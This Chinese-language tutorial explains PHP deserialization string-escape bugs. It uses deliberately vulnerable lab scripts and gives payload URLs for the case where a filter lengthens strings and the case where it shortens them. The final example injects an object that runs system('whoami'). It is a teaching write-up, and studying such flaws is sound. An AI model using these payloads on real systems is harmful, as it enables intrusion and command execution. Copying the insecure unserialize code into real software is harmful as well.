## **前言：**

有些漏洞或许在日常的渗透测试中不会出现，但只要你愿意花一点时间去学习，你将会得到不一样的感悟，天使在想象中,魔鬼在细节里，挖洞亦是如此。

##  **漏洞特性：**

字符逃逸，一定是 先 serialize()，然后 过滤字符串长度发生变化，然后 unserialize() 。从而实现逃逸,不管字符增多 or
字符减少，都一样，就是我们构造的都是反序列化之后的字符串

当数组元素都是字符串的时反序列化结果是以 ;} 结尾

a:2:{i:0;s:21:"jack";i:1;s:3:"gir";}";i:1;s:9:"say hello";}

当数组元素是对象或数组的时候反序列化结果是以}结尾

对象：a:2:{i:0;s:34:"xxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}";i:1;O:1:"A":1:{s:3:"sex";s:3:"boy";}}

数组：a:2:{i:0;s:34:"xxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}";i:1;a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}}

如果数组元素的属性都是数组或对象那么元素与元素之间没有分号;分隔

a:2:{i:0;O:1:"A":1:{s:3:"sex";s:3:"boy";}i:1;O:1:"A":1:{s:3:"sex";s:3:"boy";}}

以下原码属于既有字符串也有对象的情况：

    
    
    <?php  
    highlight_file(__FILE__);  
    class A{  
    public $sex='boy';  
    }  
    function text($str){  
    return str_replace('x','66',$str);  
    }  
    $name=$_GET['name'];  
    $sex= new A;  
    $person = array($name,$sex);  
    echo serialize($person);  
    echo "<br>";  
    $r = text(serialize($person));  
    echo $r;  
    echo "<br>";  
    $rs=unserialize($r);  
    echo $rs[0]."<br>";  
    var_dump(unserialize($r));  
    ?>

 **字符增多的情况：**

    
    
    //ctf1.php
    <?php
    highlight_file(__FILE__);
    function text($str){
        return str_replace('x','xx',$str);
    }
    $name=$_GET['name'];
    $sex= "boy";
    $person = array($name,$sex);
    echo serialize($person);
    echo "<br>";
    $r = text(serialize($person));
    echo $r;
    echo "<br>";
    $rs=unserialize($r);
    echo $rs[0]."<br>";
    var_dump(unserialize($r));
    ?>
    payload: http://127.0.0.1/ctf1.php?name=xxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}//改变了$sex的值

一个字符变为两个字符我们要逃逸的字符是 ";i:1;s:3:"gir";} 为17个字符那么我们前面只需要有17个x就可以实现
";i:1;s:3:"gir";} 逃逸被识别为序列化的一个属性。

过滤前序列化结果为：

a:2:{i:0;s:34:"xxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}";i:1;s:3:"boy";}

过滤后结果为：

a:2:{i:0;s:34:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}";i:1;s:3:"boy";}

a:2:{i:0;s:34:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";i:1;s:3:"gir";}被识别为一个序列化对象，";i:1;s:3:"boy";}被舍弃从而实现$sex的值被修改为girl

![1626447105_60f19d017f7ea26c3b3e8.png!small](https://image.3001.net/images/20210716/1626447105_60f19d017f7ea26c3b3e8.png!small)

##  **字符减少的情况：**

    
    
    //ctf1.php
    <?php
    header("Content-type: text/html; charset=utf-8");
    highlight_file(__FILE__);
    function filter($str){
        //特殊字符处理
        return str_replace('xx','x',$str);
    }
    $name=$_GET['name'];
    $sex= $_GET['sex'];
    $person = array($name,$sex);
    echo "<br>过滤前".serialize($person);
    $r = filter(serialize($person));
    echo "<br>过滤后".$r;
    echo "<br>";
    $rs=unserialize($r);
    echo $rs[0]."<br>";
    var_dump(unserialize($r));
    ?>
    payload: http://127.0.0.1/ctf1.php?name=jemmyyxxxxxxxxxxxxxxxxxxxxxxxx&sex=";i:1;s:3:"boy";}

正常情况下：

![1626447055_60f19ccf1d84d34b4a228.png!small](https://image.3001.net/images/20210716/1626447055_60f19ccf1d84d34b4a228.png!small)

当含有特殊字符时被处理后长度变为12，这时会吞噬后面的字符，最终导致反序列化出错。

payload：[http://127.0.0.1/ctf1.php](http://127.0.0.1/ctf1.php)?name=xxxxxxxxxxxxxxxxxxxxxxxx&sex=";i:1;s:3:"boy

![1626447000_60f19c983b524cc4688f3.png!small](https://image.3001.net/images/20210716/1626447000_60f19c983b524cc4688f3.png!small)

构造正确的payload过滤前的name属性长度后是24；过滤后实际长度变成12反序列化时向后吞噬12个字符，导致sex属性逃逸出来。

![1626446982_60f19c86734d164321c6d.png!small](https://image.3001.net/images/20210716/1626446982_60f19c86734d164321c6d.png!small)

 **实例：通过字符串逃逸造成命令执行**

    
    
    //ctf1.php
    <?php
    header("Content-type: text/html; charset=utf-8");
    highlight_file(__FILE__);
    function filter($str){
         $str=str_replace('\0\0\0',chr(0).'*'.chr(0),$str);
         return $str;
    }
    class A{
        public $cmd='whoami';
        function __destruct(){
            system($this->cmd);
        }
    }
    //反序列化对象 O:1:"A":1:{s:3:"cmd";s:6:"whoami";}
    //echo serialize(new A());
    $sex=$_GET['sex'];
    $name=$_GET['name'];
    $person = array($name,$sex);
    echo "<br>过滤前".serialize($person);
    echo "<br>";
    $r = filter(serialize($person));
    echo "<br>过滤后".$r;
    echo "<br>";
    unserialize($r)
    ?>

通过对源码进行分析，发现可以通过构造A类的一个对象进行反序列造成system函数的执行。

filter函数中每一组字符替换为3个字符，也就是说每一次替换可以实现3个字符串的逃逸，我们的payload需要逃逸12个字符那么就需要4组一共24个字符。

![1626446940_60f19c5c5abf247ab9652.png!small](https://image.3001.net/images/20210716/1626446940_60f19c5c5abf247ab9652.png!small)

字符串经过filter函数处理后里面的字符只剩下12个需要向后吞噬12个字符，造成字符串
i:1;O:1:%22A%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}}
逃逸，逃逸后被反序列化造成代码执行。这里有一个小坑，你可能只看到四个*误认为只是4个字符其实是12个字符。点右键查看源代码既可以看见12个字符

![1626446876_60f19c1cc7565ad35a8f9.png!small](https://image.3001.net/images/20210716/1626446876_60f19c1cc7565ad35a8f9.png!small)

>
> payload：http://127.0.0.1/ctf1.php?name=\0\0\0\0\0\0\0\0\0\0\0\0&sex=%22;i:1;O:1:%22A%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}}

